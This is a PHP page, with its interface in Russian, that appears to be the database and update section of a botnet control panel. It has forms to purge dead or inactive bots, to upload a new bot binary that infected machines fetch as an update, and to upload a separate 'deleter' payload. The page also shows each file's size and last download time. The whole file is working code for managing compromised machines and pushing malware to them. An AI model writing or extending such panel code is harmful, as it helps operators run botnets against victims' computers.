<?php

if(!defined('GRANTED')) die;

$STATU = stat('../data/update.dat');
$STATD = stat('../data/deleter.dat');

echo '<table align=center width=900 class=table style="border:1px solid #425B6A;margin-bottom:5px;" cellpadding=1 cellspacing=1>
<tr align=center><td class=table1 colspan=2>Работа с базой</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
<form method=post action="?act=dbc">
<tr>
	<td align=right width=520px>Удалить мертвых ботов из базы</td>
	<td><input class=button name="d1" type=submit value="&raquo;">'.(($_GET['a']==1)?(' <font color=green>Удалено</font>'):('')).'</td>
</tr>
<tr>
	<td align=right>Удалить из базы ботов которые неактивны <input type=text class=text name="days" maxlength=3 style="width:30px;text-align:center;"> дней</td>
	<td><input class=button name="d2" type=submit value="&raquo;">'.(($_GET['a']==2)?(' <font color=green>Удалено</font>'):('')).'</td>
</tr>
<tr>
	<td align=right>Полностью удалить ботов из базы</td>
	<td><input class=button name="d3" type=submit value="&raquo;">'.(($_GET['a']==3)?(' <font color=green>Удалено</font>'):('')).'</td>
</tr>
</form>
<tr><td colspan=2>&nbsp;</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>

<script>
function action(act) {
	if (confirm("Точно хотите удалить файл для обновления ?")) { document.location="?act="+act}
}
</script>
<tr align=center><td class=table1 colspan=2>Обновление бота</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
'.(($STATU['size'])?('<tr><td colspan=2>
<table width=100% class=table><tr>
<td align=center width=20%><b>Размер: </b>'.$STATU['size'].' <b>байт</b></td>
<td align=center width=35%><b>Версия от: </b>'.date('d.m.y H:i:s', $STATU['mtime']).'</td>
<td align=center width=35%><b>Последняя загрузка: </b>'.date('d.m.y H:i:s', $STATU['atime']).'</td>
<td align=center><a href="javascript:action(\'duf\')">удалить</a></td>
</tr></table>
</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
'):('')).'<tr>
	<form method=post action="?act=upd" enctype="multipart/form-data">
	<td align=right>Новая версия бота для обновления: <input style="color:#000000" type=file name="filename"></td>
	<td><input class=button type=submit value="Зарузить">'.(($_GET['u']==1)?(' <font color=green>Новая версия бота успешно загружена</font>'):(($_GET['u']==2)?(' <font color=red>Ошибка загрузки</font>'):(($_GET['u']==3)?(' <font color=firebrick>Файл для обновления удален</font>'):('')))).'</td>
	</form>
</tr>
<tr><td colspan=2>&nbsp;</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>


<tr align=center><td class=table1 colspan=2>Deleter</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
'.(($STATD['size'])?('<tr><td colspan=2>
<table width=100% class=table><tr>
<td align=center width=20%><b>Размер: </b>'.$STATD['size'].' <b>байт</b></td>
<td align=center width=35%><b>Версия от: </b>'.date('d.m.y H:i:s', $STATD['mtime']).'</td>
<td align=center width=35%><b>Последняя загрузка: </b>'.date('d.m.y H:i:s', $STATD['atime']).'</td>
<td align=center><a href="javascript:action(\'ddf\')">удалить</a></td>
</tr></table>
</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
'):('')).'<tr>
	<form method=post action="?act=dlt" enctype="multipart/form-data">
	<td align=right>Новая версия deleter`а: <input style="color:#000000" type=file name="filename"></td>
	<td><input class=button type=submit value="Зарузить">'.(($_GET['d']==1)?(' <font color=green>Новая версия deleter`а успешно загружена</font>'):(($_GET['d']==2)?(' <font color=red>Ошибка загрузки</font>'):(($_GET['d']==3)?(' <font color=firebrick>Файл deleter удален</font>'):('')))).'</td>
	</form>
</tr>
<tr><td colspan=2>&nbsp;</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
</table>';

?>